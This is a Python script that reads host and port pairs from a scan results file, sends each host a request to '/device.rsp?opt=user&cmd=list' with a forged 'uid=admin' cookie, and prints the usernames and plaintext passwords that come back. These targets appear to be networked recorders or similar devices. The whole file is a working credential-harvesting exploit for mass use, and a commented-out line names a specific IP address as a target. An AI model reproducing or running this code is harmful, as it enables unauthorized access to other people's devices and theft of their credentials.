
# -*- coding: utf-8 -*-
import sys
import tableprint as tp
import requests
import json
class Colors:
    BLUE        = '\033[94m'
    GREEN       = '\033[32m'
    RED         = '\033[0;31m'
    DEFAULT     = '\033[0m'
    ORANGE      = '\033[33m'
    WHITE       = '\033[97m'
    BOLD        = '\033[1m'
    BR_COLOUR   = '\033[1;37;40m'

def makeReqHeaders(host,xCookie):
	headers = {}
	headers["Host"] = host
	headers["User-Agent"] = "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
	headers["Accept"]           = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
	headers["Accept-Languag"]   = "es-AR,en-US;q=0.7,en;q=0.3"
	headers["Connection"]       = "close"
	headers["Content-Type"]     = "text/html"
	headers["Cookie"]           = "uid="+xCookie
	return headers

def findVuln(HST,port,final_data):
	headers = {}
	fullHost_1  =   "http://"+HST+":"+str(port)+"/device.rsp?opt=user&cmd=list"
	host        =   "http://"+HST+":"+str(port)+"/"
	try:
		rX = requests.get(fullHost_1,headers=makeReqHeaders(host,xCookie="admin"),timeout=10.000)
	except Exception as e:
		#print(Colors.RED+" [+] Timed out\n"+Colors.DEFAULT)
		return
	badJson = rX.text
	try:
	    dataJson = json.loads(badJson)
	    totUsr = len(dataJson["list"])
	except Exception as e:
		#print(" [+] Error: "+str(e))
		#print(" [>] json: "+str(rX))
		return
	try:
		for obj in range(0,totUsr):
			temp =[]
			_url = str(host)[0:-1]
			_usuario    = dataJson["list"][obj]["uid"]
			_password   = dataJson["list"][obj]["pwd"]
			temp.append(_url)
			temp.append(_usuario) 
			temp.append(_password)
			final_data.append(temp)
	except Exception as e:
		return
	return
def fileToDic(file1):
	dic = {}
	lines = file1.readlines()
	isPrint = False
	for line in lines:
		if 'IP' in line:
			isPrint = True
		if 'completed' in line:
			isPrint = False
		if isPrint == True:
			list1 = line.split(' ')
			try:
				str1 = str(list1[1:2])
				str1 = str1[2:-2]
				index = str1.find(':')
				if index == -1:
					continue
				host = str1[0:index]
				port = int(str1[index+1:])
				dic[host]=port
			except Exception,e:
				#print 'error:'+str(e)
				pass
	return dic
def scan(dic):
	final_data = []
	print(Colors.GREEN+"\n [+] List:\t"+Colors.ORANGE)
	#findVuln('220.78.199.235','9000',final_data)
	for host,port in dic.items():
		findVuln(host,port,final_data)
	hdHost = Colors.GREEN + "Host" + Colors.DEFAULT
	hdUsr = Colors.GREEN + "Username" + Colors.DEFAULT
	hdPass = Colors.GREEN + "Password" + Colors.DEFAULT
	cabeceras = [hdHost,hdUsr, hdPass]
	tp.table(final_data, cabeceras, width=15)
	pass

def main():
	sResults = open('results.txt','r')
	dic = fileToDic(sResults)
	scan(dic)
	pass

if __name__ == '__main__':
	main()


